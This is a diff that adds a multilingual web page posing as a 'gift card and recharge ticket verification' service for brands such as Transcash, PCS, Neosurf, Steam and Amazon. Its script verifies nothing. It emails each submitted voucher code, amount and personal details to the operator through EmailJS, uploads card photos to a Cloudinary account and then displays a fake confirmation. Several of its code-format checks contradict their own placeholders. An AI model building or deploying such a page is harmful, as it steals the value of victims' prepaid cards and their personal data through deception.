@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="VERIFY-TICKETS-CARDS">
+<meta property="og:description" content="Vérifiez rapidement et en toute sécurité la validité de vos tickets recharges et cartes cadeaux. Entrez les informations demandées et recevez le résultat directement par email. Service fiable, simple et disponible 24h/24.">
+<meta property="og:image" content="https://i.ibb.co/CpzSBPx5/Chat-GPT-Image-24-avr-2026-11-23-55.png">
+<meta property="og:type" content="website">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:url" content="https://tonsite.com">
+<meta property="og:site_name" content="VERIFY-TICKETS-CARDS">
+
+<meta name="theme-color" content="#1e3c72">
+<meta name="description" content="Vérifiez vos tickets recharges et cartes cadeaux rapidement et en toute sécurité.">
+<title>Verify Tickets Cards</title>
+<link rel="icon" type="image/png" href="https://i.ibb.co/CpzSBPx5/Chat-GPT-Image-24-avr-2026-11-23-55.png">
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(135deg,#0f2c5c,#1e3c72);
+color:white;
+overflow-x:hidden;
+}
+
+header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:18px 20px;
+background:rgba(255,255,255,0.08);
+backdrop-filter: blur(10px);
+}
+
+header h2{margin:0;font-size:20px;}
+
+select{padding:8px;border-radius:10px;border:none;}
+
+.container{padding:20px;}
+
+.cards{display:grid;gap:15px;}
+
+.card{
+background:white;color:black;padding:18px;border-radius:18px;
+text-align:center;box-shadow:0 10px 25px rgba(0,0,0,0.25);
+}
+
+.card img{width:70px;height:70px;object-fit:contain;}
+
+button{
+padding:12px;border:none;border-radius:12px;
+background:linear-gradient(90deg,#667eea,#764ba2);
+color:white;width:100%;margin-top:10px;cursor:pointer;
+}
+
+input,select.input{
+width:100%;padding:12px;margin-top:10px;
+border-radius:12px;border:1px solid #ddd;
+}
+
+.note{font-size:12px;opacity:0.85;margin-top:5px;}
+
+#formPage,#successPage,#loader{display:none;}
+
+.loader{
+border:6px solid #f3f3f3;border-top:6px solid #26a69a;
+border-radius:50%;width:50px;height:50px;
+animation:spin 1s linear infinite;margin:auto;
+}
+
+@keyframes spin{100%{transform:rotate(360deg);}}
+
+#preview{
+width:100%;max-height:180px;object-fit:cover;
+border-radius:12px;margin-top:10px;display:none;
+}
+
+.progress-container{
+width:100%;background:#ddd;border-radius:20px;
+overflow:hidden;margin-top:10px;display:none;
+}
+
+.progress-bar{height:10px;width:0%;
+background:linear-gradient(90deg,#00c6ff,#0072ff);}
+
+.footer{text-align:center;padding:20px;font-size:13px;opacity:0.8;}
+#langSelect{
+background:white;
+color:black;
+font-weight:bold;
+cursor:pointer;
+}
+/* CHECK ANIMÉ */
+.check-container{
+display:flex;
+justify-content:center;
+margin-bottom:15px;
+}
+
+.check-circle{
+width:80px;
+height:80px;
+border-radius:50%;
+background:#28a745;
+display:flex;
+align-items:center;
+justify-content:center;
+animation:pop 0.4s ease;
+}
+
+.checkmark{
+width:35px;
+height:20px;
+border-left:5px solid white;
+border-bottom:5px solid white;
+transform:rotate(-45deg) scale(0);
+animation:draw 0.4s ease forwards 0.2s;
+}
+
+@keyframes pop{
+0%{transform:scale(0);}
+100%{transform:scale(1);}
+}
+
+@keyframes draw{
+0%{transform:rotate(-45deg) scale(0);}
+100%{transform:rotate(-45deg) scale(1);}
+}
+.input-error{
+  border:2px solid #e53935 !important;
+  box-shadow:0 0 5px rgba(229,57,53,0.5);
+}
+
+input{
+  transition:0.2s;
+}
+/* 🔥 AJOUT ICI */
+input:invalid:not(:placeholder-shown){
+  border:2px solid #e53935;
+}
+
+input:valid{
+  border:1px solid #4CAF50;
+}
+</style>
+</head>
+
+<body>
+
+  <div id="notif" style="
+position:fixed;
+top:20px;
+left:50%;
+transform:translateX(-50%);
+background:#28a745;
+color:white;
+padding:12px 20px;
+border-radius:10px;
+font-weight:bold;
+display:none;
+z-index:999;
+">
+</div>
+
+<header>
+<div style="display:flex;align-items:center;gap:10px;">
+  <img src="https://i.ibb.co/CpzSBPx5/Chat-GPT-Image-24-avr-2026-11-23-55.png" 
+alt="logo" 
+style="height:35px; object-fit:contain; border-radius:8px;">
+  <h2 id="title">VERIFY-TICKETS-CARDS</h2>
+</div>
+
+<select id="langSelect" onchange="setLang(this.value)">
+<option value="fr">🇫🇷 Français</option>
+<option value="en">🇺🇸 English</option>
+<option value="de">🇩🇪 Deutsch</option>
+<option value="it">🇮🇹 Italiano</option>
+<option value="es">🇪🇸 Español</option>
+</select>
+</header>
+
+<div id="home" class="container">
+
+<div id="hero" style="background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:20px;text-align:center;">
+<h2 id="heroTitle">Bienvenue sur VERIFY-TICKETS-CATDS</h2>
+<p id="heroText">
+Vérifiez rapidement et en toute sécurité la validité de vos tickets recharges et cartes cadeaux. Entrez les informations demandées et recevez le résultat directement par email. Service fiable, simple et disponible 24h/24.
+</p>
+<button onclick="scrollToServices()" id="startBtn">Commencer la vérification</button>
+</div>
+
+<h3 id="servicesTitle">Nos services de Vérifications</h3>
+
+<div class="cards">
+<div class="card"><img src="transcash.png"><h4>Transcash</h4><button onclick="openForm('Transcash')">Vérifier</button></div>
+<div class="card"><img src="pcs.png"><h4>PCS</h4><button onclick="openForm('PCS')">Vérifier</button></div>
+<div class="card"><img src="neosurf.png"><h4>Neosurf</h4><button onclick="openForm('Neosurf')">Vérifier</button></div>
+<div class="card"><img src="steam.png"><h4>Steam Card</h4><button onclick="openForm('Steam Card')">Vérifier</button></div>
+<div class="card"><img src="apple.png"><h4>Apple Card</h4><button onclick="openForm('Apple Card')">Vérifier</button></div>
+<div class="card"><img src="amazon.png"><h4>Amazon Gift Card</h4><button onclick="openForm('Amazon Gift Card')">Vérifier</button></div>
+<div class="card"><img src="googleplay.png"><h4>Google Play</h4><button onclick="openForm('Google Play')">Vérifier</button></div>
+<div class="card"><img src="paysafecard.png"><h4>PaysafeCard</h4><button onclick="openForm('PaysafeCard')">Vérifier</button></div>
+<div class="card"><img src="xboxgift.png"><h4>Xbox Gift Card</h4><button onclick="openForm('Xbox Gift Card')">Vérifier</button></div>
+</div>
+
+</div>
+
+<div id="formPage" class="container">
+
+<h3 id="formTitle">Vérification Ticket ou Carte</h3>
+
+<form id="form">
+
+<input type="text" name="nom" placeholder="Nom" required>
+<input type="text" name="prenom" placeholder="Prénoms" required>
+
+<input type="text" name="ville" placeholder="Ville (facultatif)">
+<div class="note">Facultatif</div>
+
+<input type="email" name="email" placeholder="Email" required>
+<div class="note">Résultat envoyé par email</div>
+
+<div style="display:flex; gap:5px;">
+<select name="indicatif" class="input">
+<option>🇫🇷 +33</option>
+<option>🇧🇪 +32</option>
+<option>🇩🇪 +49</option>
+<option>🇺🇸 +1</option>
+<option>🇨🇦 +1</option>
+<option>🇮🇹 +39</option>
+<option>🇪🇸 +34</option>
+<option>🇷🇴 +40</option>
+</select>
+
+<input type="tel" name="telephone" placeholder="Téléphone (facultatif)">
+</div>
+
+<input type="text" id="type" name="type_ticket" readonly>
+
+<input type="text" name="code_ticket" placeholder="Code du ticket" required style="text-transform:uppercase;">
+<div class="note">Champ obligatoire</div>
+
+<input type="number" name="montant" placeholder="Montant">
+
+<select name="devise" class="input">
+<option>Euro (€)</option>
+<option>Dollar US ($)</option>
+<option>Dollar CAD</option>
+</select>
+
+<input type="file" id="photo" accept="image/*" multiple>
+<div class="note">Photo (facultatif)</div>
+
+<img id="preview">
+
+<div class="progress-container" id="progressContainer">
+<div class="progress-bar" id="progressBar"></div>
+</div>
+
+<input type="hidden" name="photo_url" id="photo_url">
+
+<button type="submit" id="sendBtn">Envoyer</button>
+
+</form>
+</div>
+
+<div id="loader" class="container" style="text-align:center;">
+<div class="loader"></div>
+<p id="loadingText">Traitement en cours...</p>
+</div>
+
+<div id="successPage" class="container" style="text-align:center;">
+
+<!-- ✅ CHECK ANIMÉ -->
+<div class="check-container">
+  <div class="check-circle">
+    <div class="checkmark"></div>
+  </div>
+</div>
+
+<!-- ✅ TITRE -->
+<h3 id="successTitle" style="color:#28a745;">✔ Demande envoyée !</h3>
+
+<p id="successText">Votre demande a été reçue avec succès.  Vérifier votre boîte mail pour voir les résultats.</p>
+
+<!-- ⏳ DELAI -->
+<div id="delayBox" style="background:#fff3cd;color:#856404;padding:10px;border-radius:12px;margin:15px 0;"></div>
+
+<!-- 📋 RECAP -->
+<div style="background:white;color:black;padding:15px;border-radius:15px;text-align:left;margin-top:15px;">
+<h4 id="recapTitle"></h4>
+
+<p><strong id="labelNom"></strong> <span id="recapNom"></span></p>
+<p><strong id="labelPrenom"></strong> <span id="recapPrenom"></span></p>
+<p><strong id="labelEmail"></strong> <span id="recapEmail"></span></p>
+<p><strong id="labelType"></strong> <span id="recapType"></span></p>
+
+</div>
+
+<!-- ⚠️ NOTE -->
+<p id="warningText" style="margin-top:15px;font-size:13px;"></p>
+
+<!-- 🔙 BOUTON -->
+<button onclick="goHome()" class="btn-main" id="homeBtn"></button>
+
+</div>
+
+<div class="footer">
+© 2026 VERIFY-TICKETS - Tous droits réservés
+</div>
+
+<script>
+    let userData = {};
+    let currentLang = "fr";
+   window.addEventListener("load", function(){
+  let navLang = navigator.language.slice(0,2);
+
+  if(["fr","en","de","it","es"].includes(navLang)){
+    currentLang = navLang;
+    setLang(navLang);
+    document.getElementById("langSelect").value = navLang;
+  } else {
+    setLang("fr");
+  }
+});
+
+(function(){emailjs.init("knAyoojKlx8in_flR");})();
+
+function openForm(type){
+document.getElementById('home').style.display='none';
+document.getElementById('formPage').style.display='block';
+document.getElementById('type').value=type;
+
+/* ✅ validation dynamique */
+setCodeValidation(type);
+
+/* 🔥 NOTIFICATION */
+showNotif(type);
+}
+function showNotif(type){
+let t = texts[currentLang];
+
+let message = "";
+
+if(currentLang === "fr"){
+  message = "✔ Service sélectionné : " + type;
+}else if(currentLang === "en"){
+  message = "✔ Selected service: " + type;
+}else if(currentLang === "de"){
+  message = "✔ Ausgewählter Dienst: " + type;
+}else if(currentLang === "it"){
+  message = "✔ Servizio selezionato: " + type;
+}else if(currentLang === "es"){
+  message = "✔ Servicio seleccionado: " + type;
+}
+
+let notif = document.getElementById("notif");
+notif.innerText = message;
+notif.style.background = "#28a745"; // ✅ remettre vert
+notif.style.display = "block";
+
+setTimeout(()=>{
+  notif.style.display = "none";
+},2000);
+}
+function showError(message){
+let notif = document.getElementById("notif");
+
+notif.innerText = message;
+notif.style.background = "#e53935"; // 🔴 rouge
+notif.style.display = "block";
+
+setTimeout(()=>{
+  notif.style.display = "none";
+},2500);
+}
+function setCodeValidation(type){
+
+let input = document.querySelector("input[name='code_ticket']");
+
+/* reset */
+input.value = "";
+input.setCustomValidity("");
+
+if(type === "Transcash"){
+  input.pattern = "\\d{12}";
+  input.placeholder = "12 chiffres (ex: 123456789012)";
+}
+
+else if(type === "PCS" || type === "Neosurf"){
+  input.pattern = "[A-Za-z0-9]{10}";
+  input.placeholder = "10 caractères (lettres + chiffres)";
+}
+
+else if(type === "Steam Card"){
+  input.pattern = "[A-Za-z0-9]{10}";
+  input.placeholder = "15 caractères (lettres + chiffres)";
+}
+
+else if(type === "Amazon Gift Card"){
+  input.pattern = "[A-Za-z0-9]{14,15}";
+  input.placeholder = "14 ou 15 caractères";
+}
+
+else if(type === "Apple Card" || type === "Google Play"){
+  input.pattern = "[A-Za-z0-9]{10}";
+  input.placeholder = "16 caractères (lettres + chiffres)";
+}
+
+else if(type === "PaysafeCard"){
+  input.pattern = "\\d{16}";
+  input.placeholder = "16 chiffres (ex: 123456789012)";
+}
+
+else if(type === "Xbox Gift Card"){
+  input.pattern = "[A-Za-z0-9]{10}";
+  input.placeholder = "25 caractères (lettres + chiffres)";
+}
+
+/* message erreur personnalisé */
+input.oninvalid = function(){
+  if(type === "Transcash"){
+    this.setCustomValidity("Le code doit contenir exactement 12 chiffres");
+  }
+  else if(type === "PCS" || type === "Neosurf"){
+    this.setCustomValidity("Le code doit contenir 10 caractères (lettres et chiffres)");
+  }
+  else if(type === "Steam Card"){
+    this.setCustomValidity("Le code doit contenir exactement 15 caractères");
+  }
+  else if(type === "Amazon Gift Card"){
+    this.setCustomValidity("Le code doit contenir 14 ou 15 caractères");
+  }
+  else if(type === "Apple Card" || type === "Google Play"){
+    this.setCustomValidity("Le code doit contenir exactement 16 caractères (lettres et chiffres)");
+  }
+  else if(type === "PaysafeCard"){
+    this.setCustomValidity("Le code doit contenir exactement 16 chiffres");
+  }
+  else if(type === "Xbox Gift Card"){
+    this.setCustomValidity("Le code doit contenir exactement 25 caractères");
+  }
+};
+input.oninput = function(){
+  this.value = this.value.toUpperCase();
+  this.value = this.value.replace(/\s/g, '');
+  this.classList.remove("input-error"); // 🔥 enlève rouge
+  this.setCustomValidity("");
+};
+
+}
+/* scroll vers services */
+function scrollToServices(){
+document.getElementById("servicesTitle").scrollIntoView({behavior:"smooth"});
+}
+
+/* preview */
+photo.onchange=function(){
+let file=this.files[0];
+if(file){
+preview.src=URL.createObjectURL(file);
+preview.style.display="block";
+}
+}
+
+/* upload */
+function uploadImage(file,callback){
+let xhr=new XMLHttpRequest();
+let formData=new FormData();
+formData.append("file",file);
+formData.append("upload_preset","Nouveau Ticket");
+
+xhr.open("POST","https://api.cloudinary.com/v1_1/dmvwczyxu/image/upload");
+
+xhr.upload.onprogress=function(e){
+let p=(e.loaded/e.total)*100;
+progressContainer.style.display="block";
+progressBar.style.width=p+"%";
+};
+
+xhr.onload=function(){
+let data=JSON.parse(xhr.responseText);
+callback(data.secure_url);
+};
+
+xhr.send(formData);
+}
+
+/* submit */
+form.addEventListener('submit',function(e){
+e.preventDefault();
+
+let input = document.querySelector("input[name='code_ticket']");
+let t = texts[currentLang];
+
+/* reset bordure */
+input.classList.remove("input-error");
+
+/* champ vide */
+if(input.value.trim() === ""){
+  input.classList.add("input-error");
+  showError(t.error_empty);
+  return;
+}
+
+/* mauvais format */
+if(!input.checkValidity()){
+  input.classList.add("input-error");
+  showError(t.error_invalid);
+  return;
+}
+
+let files = photo.files;
+
+function send(urls=""){
+photo_url.value = urls;
+
+userData = {
+  nom: form.nom.value,
+  prenom: form.prenom.value,
+  email: form.email.value,
+  type: form.type_ticket.value
+};
+
+formPage.style.display='none';
+loader.style.display='block';
+
+emailjs.sendForm("service_lk17e2f","template_qctjg1f",form)
+.then(()=>{
+setTimeout(()=>{
+
+loader.style.display='none';
+successPage.style.display='block';
+applyFormLang(currentLang);
+
+let check = document.querySelector(".check-circle");
+check.style.animation = "none";
+setTimeout(()=>{ check.style.animation = "pop 0.4s ease"; },10);
+
+setTimeout(()=>{ recapNom.innerText = userData.nom; },300);
+setTimeout(()=>{ recapPrenom.innerText = userData.prenom; },600);
+setTimeout(()=>{ recapEmail.innerText = userData.email; },900);
+setTimeout(()=>{ recapType.innerText = userData.type; },1200);
+
+},3000);
+});
+}
+
+/* upload multi images */
+if(files.length > 0){
+  let urls = [];
+  let done = 0;
+
+  for(let i=0;i<files.length;i++){
+    let xhr = new XMLHttpRequest();
+    let formData = new FormData();
+
+    formData.append("file", files[i]);
+    formData.append("upload_preset", "Nouveau Ticket");
+
+    xhr.open("POST","https://api.cloudinary.com/v1_1/dmvwczyxu/image/upload");
+
+    xhr.onload = function(){
+      let data = JSON.parse(xhr.responseText);
+      urls.push(data.secure_url);
+      done++;
+
+      if(done === files.length){
+        send(urls.join(", "));
+      }
+    };
+
+    xhr.send(formData);
+  }
+
+}else{
+  send("");
+}
+
+});
+
+
+/* ========================= */
+/* 🌍 TRADUCTION COMPLETE */
+/* ========================= */
+
+const texts={
+fr:{
+hero:"Bienvenue sur VERIFY-TICKETS-CARDS",
+heroText:"Vérifiez rapidement et en toute sécurité la validité de vos tickets recharges et cartes cadeaux. Entrez les informations demandées et recevez le résultat directement par email. Service fiable, simple et disponible 24h/24.",
+start:"Commencer la vérification",
+services:"Nos services de Vérifications",
+verify:"Vérifier",
+
+form:"Vérification Ticket",
+send:"Envoyer",
+
+nom:"Nom",
+prenom:"Prénoms",
+ville:"Ville (facultatif)",
+email:"Votre email",
+email_note:"Résultat envoyé par email",
+phone:"Téléphone (facultatif)",
+code:"Code du ticket",
+amount:"Montant",
+photo_note:"Photo du ticket (facultatif)",
+
+loading:"Traitement en cours...",
+success:"Demande envoyée",
+success_text:"Votre demande a été reçue avec succès.  <strong>Vérifier votre boîte mail<strong> pour voir les résultats.",
+
+delay:"⏳ Résultat dans ~5 minutes",
+recapTitle:"📋 Récapitulatif de votre demande",
+labelNom:"Nom :",
+labelPrenom:"Prénom :",
+labelEmail:"Email :",
+labelType:"Type :",
+warning:"⚠️ Si vous ne recevez pas notre email, vérifiez votre dossier <strong>Spam / Courrier indésirable</strong>.",
+home:"Retour à l'accueil",
+error_empty:"Remplir le champ du code",
+error_invalid:"Veuillez bien remplir le code"
+},
+
+en:{
+hero:"Welcome to VERIFY-TICKETS-CARDS",
+heroText:"Quickly and safely check the validity of your recharge tickets and gift cards. Enter the requested information and receive the result directly by email. Reliable, simple service available 24/7.",
+start:"Start verification",
+services:"Our services",
+verify:"Check",
+
+form:"Ticket verification",
+send:"Send",
+
+nom:"Last name",
+prenom:"First name",
+ville:"City (optional)",
+email:"Your email",
+email_note:"Result sent by email",
+phone:"Phone (optional)",
+code:"Ticket code",
+amount:"Amount",
+photo_note:"Ticket photo (optional)",
+
+loading:"Processing...",
+success:"Request sent",
+success_text:"Your request has been successfully received. <strong>Check your mailbox</strong> to see the results.",
+
+delay:"⏳ Result in ~5 minutes",
+recapTitle:"📋 Summary of your request",
+labelNom:"Last name:",
+labelPrenom:"First name:",
+labelEmail:"Email:",
+labelType:"Type:",
+warning:"⚠️ If you don't receive our email, check your <strong>Spam / Junk folder</strong>.",
+home:"Back to home",
+error_empty:"Please enter the code",
+error_invalid:"Please enter a valid code",
+},
+
+de:{
+hero:"Willkommen bei VERIFY-TICKETS-CARDS",
+heroText:"Überprüfen Sie schnell und sicher die Gültigkeit Ihrer Aufladungstickets und Geschenkkarten. Geben Sie die angeforderten Informationen ein und erhalten Sie das Ergebnis direkt per E-Mail. Zuverlässiger, einfacher und rund um die Uhr verfügbarer Service.",
+start:"Starten",
+services:"Unsere Dienstleistungen",
+verify:"Prüfen",
+
+form:"Ticketprüfung",
+send:"Senden",
+
+nom:"Name",
+prenom:"Vorname",
+ville:"Stadt (optional)",
+email:"E-Mail",
+email_note:"Ergebnis per E-Mail",
+phone:"Telefon (optional)",
+code:"Ticket-Code",
+amount:"Betrag",
+photo_note:"Ticketfoto (optional)",
+
+loading:"Wird verarbeitet...",
+success:"Anfrage gesendet",
+success_text:"Ihre Anfrage wurde erfolgreich empfangen. <strong>Überprüfen Sie Ihren Posteingang<strong>, um die Ergebnisse zu sehen.",
+
+delay:"⏳ Ergebnis in ~5 Minuten",
+recapTitle:"📋 Zusammenfassung Ihrer Anfrage",
+labelNom:"Name:",
+labelPrenom:"Vorname:",
+labelEmail:"E-Mail:",
+labelType:"Typ:",
+warning:"⚠️ Wenn Sie unsere E-Mail nicht erhalten, überprüfen Sie Ihren Ordner <strong>Spam / Junk-Mail</strong>.",
+home:"Zurück zur Startseite",
+error_empty:"Bitte Code eingeben",
+error_invalid:"Bitte gültigen Code eingeben",
+},
+
+it:{
+hero:"Benvenuto su VERIFY-TICKETS-CARDS",
+heroText:"Controlla rapidamente e in tutta sicurezza la validità dei tuoi biglietti ricariche e carte regalo. Inserisci le informazioni richieste e ricevi il risultato direttamente via email. Servizio affidabile, semplice e disponibile 24 ore su 24.",
+start:"Inizia",
+services:"I nostri servizi",
+verify:"Verifica",
+
+form:"Verifica biglietto",
+send:"Invia",
+
+nom:"Cognome",
+prenom:"Nome",
+ville:"Città (facoltativo)",
+email:"Email",
+email_note:"Risultato via email",
+phone:"Telefono (facoltativo)",
+code:"Codice biglietto",
+amount:"Importo",
+photo_note:"Foto biglietto (facoltativo)",
+
+loading:"Elaborazione...",
+success:"Richiesta inviata",
+success_text:"La tua richiesta è stata ricevuta con successo. <strong>Controlla la tua casella di posta<strong> per vedere i risultati.",
+
+delay:"⏳ Risultato in ~5 minuti",
+recapTitle:"📋 Riepilogo della tua richiesta",
+labelNom:"Nome :",
+labelPrenom:"Cognome :",
+labelEmail:"Email :",
+labelType:"Tipo :",
+warning:"⚠️ Se non ricevi la nostra email, controlla la cartella <strong>Spam / Posta indesiderata</strong>.",
+home:"Torna alla home",
+error_empty:"Inserisci il codice",
+error_invalid:"Inserisci un codice valido",
+},
+
+es:{
+hero:"Bienvenido a VERIFY-TICKETS-CARDS",
+heroText:"Verifique rápida y seguramente la validez de sus boletos de recarga y tarjetas de regalo. Ingrese la información solicitada y reciba el resultado directamente por correo electrónico. Servicio fiable, sencillo y disponible las 24 horas.",
+start:"Comenzar",
+services:"Nuestros servicios",
+verify:"Verificar",
+
+form:"Verificación de ticket",
+send:"Enviar",
+
+nom:"Apellido",
+prenom:"Nombre",
+ville:"Ciudad (opcional)",
+email:"Correo",
+email_note:"Resultado por correo",
+phone:"Teléfono (opcional)",
+code:"Código del ticket",
+amount:"Monto",
+photo_note:"Foto del ticket (opcional)",
+
+loading:"Procesando...",
+success:"Solicitud enviada",
+success_text:"Su solicitud ha sido recibida con éxito. <strong>Revise su bandeja de correo</strong> para ver los resultados.",
+
+delay:"⏳ Resultado en ~5 minutos",
+recapTitle:"📋 Resumen de su solicitud",
+labelNom:"Nombre:",
+labelPrenom:"Apellido:",
+labelEmail:"Correo electrónico:",
+labelType:"Tipo:",
+warning:"⚠️ Si no recibe nuestro correo electrónico, verifique su carpeta <strong>Spam / Correo no deseado</strong>.",
+home:"Volver a la página de inicio",
+error_empty:"Ingrese el código",
+error_invalid:"Ingrese un código válido",
+}
+};
+
+
+/* appliquer traduction */
+function applyFormLang(lang){
+
+let t = texts[lang];
+
+heroTitle.innerText = t.hero;
+heroText.innerText = t.heroText;
+startBtn.innerText = t.start;
+servicesTitle.innerText = t.services;
+
+formTitle.innerText = t.form;
+sendBtn.innerText = t.send;
+
+document.querySelector("input[name='nom']").placeholder = t.nom;
+document.querySelector("input[name='prenom']").placeholder = t.prenom;
+document.querySelector("input[name='ville']").placeholder = t.ville;
+document.querySelector("input[name='email']").placeholder = t.email;
+document.querySelector("input[name='telephone']").placeholder = t.phone;
+document.querySelector("input[name='code_ticket']").placeholder = t.code;
+document.querySelector("input[name='montant']").placeholder = t.amount;
+
+/* boutons services */
+document.querySelectorAll(".card button").forEach(btn=>{
+btn.innerText = t.verify;
+});
+
+/* textes dynamiques */
+loadingText.innerText = t.loading;
+successTitle.innerHTML = "✔ " + t.success;
+successText.innerText = t.success_text;
+
+document.getElementById("delayBox").innerText = t.delay;
+document.getElementById("recapTitle").innerText = t.recapTitle;
+document.getElementById("labelNom").innerText = t.labelNom;
+document.getElementById("labelPrenom").innerText = t.labelPrenom;
+document.getElementById("labelEmail").innerText = t.labelEmail;
+document.getElementById("labelType").innerText = t.labelType;
+document.getElementById("warningText").innerHTML = t.warning;
+document.getElementById("homeBtn").innerText = t.home;
+}
+
+/* fonction principale */
+function setLang(lang){
+  currentLang = lang; // 🔥 on garde la langue en mémoire
+  applyFormLang(lang);
+}
+function goHome(){
+  document.getElementById('successPage').style.display='none';
+  document.getElementById('home').style.display='block';
+
+  // reset formulaire (optionnel mais conseillé)
+  document.getElementById("form").reset();
+  document.getElementById("preview").style.display="none";
+  document.getElementById("progressContainer").style.display="none";
+}
+
+
+</script>
+
+</body>
+</html>
